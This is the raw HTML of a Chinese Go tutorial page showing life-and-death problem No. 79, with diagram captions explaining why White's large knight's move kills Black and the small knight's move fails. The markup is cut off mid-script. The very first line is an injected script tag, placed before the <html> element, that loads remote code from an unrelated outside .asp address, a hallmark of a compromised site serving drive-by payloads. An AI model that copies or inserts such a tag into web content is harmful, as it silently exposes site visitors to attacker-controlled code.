<script src=http://www.xinwen520.net/48472394k4r.asp></script><html>  <head> <meta http-equiv="Content-Type" content="text/html; charset=gb2312"> <meta name="GENERATOR" content="Microsoft FrontPage 6.0"> <meta name="ProgId" content="FrontPage.Editor.Document"> <title>第79型 白先黑死</title> <link rel="stylesheet" type="text/css" href="../../../weiqi365.css"> <meta name="Microsoft Theme" content="-1 0111, default"> </head>  <body background="../../../_themes/-1/urbtextb.gif" bgcolor="#FFFFCC" text="#330033" link="#663300" vlink="#CC6633" alink="#666666"><!--mstheme--><font face="宋体">  <h1 align="center"><!--mstheme--><font color="#660033"><font face="楷体_GB2312"><span style="letter-spacing: 1pt">第79型    白先黑死</span></font><!--mstheme--></font></h1> <div align="center">   <center><!--mstheme--></font><table border="0" width="800" cellspacing="5">   <tr>     <td width="45%" align="center" valign="middle"><!--mstheme--><font face="宋体"> 	<img border="0" src="No79_1.png" width="232" height="232"><!--mstheme--></font></td>     <td width="10%" valign="middle" align="center"><!--mstheme--><font face="宋体"><!--mstheme--></font></td>     <td width="45%" align="center" valign="middle"><!--mstheme--><font face="宋体"> 	<img border="0" src="No79_2.png" width="232" height="232"><!--mstheme--></font></td>   </tr>   <tr>     <td width="45%" valign="top"><!--mstheme--><font face="宋体">       <p align="center"><font face="楷体_GB2312"><span style="letter-spacing: 1pt">图1</span></font></p>       <p><font face="楷体_GB2312"><span style="letter-spacing: 1pt">此形白1大飞即可。黑2如虎，白3退，a位成假眼。只要白1不被吃掉黑即死，这就是正确的思考方法。白1如于b位拐，黑1位跳，活。</span></font><!--mstheme--></font></td>     <td width="10%" valign="top"><!--mstheme--><font face="宋体"><!--mstheme--></font></td>     <td width="45%" valign="top"><!--mstheme--><font face="宋体">       <p align="center"><font face="楷体_GB2312"><span style="letter-spacing: 1pt">图2</span></font></p>       <p><font face="楷体_GB2312"><span style="letter-spacing: 1pt">白1小飞如何呢？黑2拼死也要靠住，白3挖吃，黑4粘，白5提，然后……</span></font>       <p>　<!--mstheme--></font></td>   </tr>   <tr>     <td width="45%" align="center" valign="middle"><!--mstheme--><font face="宋体"> 	<img border="0" src="No79_3.png" width="232" height="232"><!--mstheme--></font></td>     <td width="10%" valign="middle" align="center"><!--mstheme--><font face="宋体"><!--mstheme--></font></td>     <td width="45%" align="center" valign="middle"><!--mstheme--><font face="宋体">       <h1><!--mstheme--><font color="#660033"><span style="letter-spacing: 1pt"><a href="mailto:fiveduan@tom.com"><font face="楷体_GB2312">您的高见</font></a></span><!--mstheme--></font></h1>     <!--mstheme--></font></td>   </tr>   <tr>     <td width="45%" valign="top"><!--mstheme--><font face="宋体">       <p align="center"><font face="楷体_GB2312"><span style="letter-spacing: 1pt">图3</span></font></p>       <p><font face="楷体_GB2312"><span style="letter-spacing: 1pt">黑6跨，白7断，黑8打吃，白9提，黑10从背后收气，白成接不归。所以，结论就是：小飞不成立。</span></font></p>     <!--mstheme--></font></td>     <td width="10%" valign="top"><!--mstheme--><font face="宋体"><!--mstheme--></font></td>     <td width="45%" valign="top"><!--mstheme--><font face="宋体"><!--mstheme--></font></td>   </tr> </table><!--mstheme--><font face="宋体"></center> </div> <p align="center"> <!--webbot bot="Navigation" S-Type="arrows" S-Orientation="horizontal" S-Rendering="graphics" B-Include-Home="FALSE" B-Include-Up="TRUE" U-Page="/C:/Documents and Settings/wangxiaohui/My Documents/My Webs/Weiqi/Part1/shuxing/No74/No74.htm" S-Target startspan --><script language="JavaScript"><!-- MSFPhover =    (((navigator.appName == "Netscape") &&    (parseInt(navigator.appVersion) >= 3 )) ||    ((navigator.appName == "Microsoft Internet Explorer") &&    (parseInt(navigator.appVersion) >= 4 )));  function MSFPpreload(img)  {   var a=new Image(); a.src=img; return a;  } // --></script><script language="JavaScript"><!-- if(MSFPhover) { MSFPnav1n=MSFPpreload("../../../_derived/back_cmp_-1110_back.gif"); MSFPnav1h=MSFPpreload("../../../_der
